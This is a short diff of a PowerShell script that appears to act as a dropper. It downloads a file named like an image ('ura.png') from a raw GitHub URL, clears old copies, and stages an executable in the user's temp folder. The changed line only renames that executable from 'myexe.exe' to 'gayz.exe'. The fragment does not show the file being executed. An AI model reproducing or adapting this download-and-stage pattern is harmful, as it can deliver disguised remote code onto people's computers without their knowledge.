@@ -19,7 +19,7 @@ if (Test-Path $file) {
 else { Write-host "$file doesn't exist" }
 $client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $file)
 
-$file = $env:temp + "\myexe.exe" 
+$file = $env:temp + "\gayz.exe"
 if (Test-Path $file) {
   Remove-Item $file
   write-host "$file has been deleted"
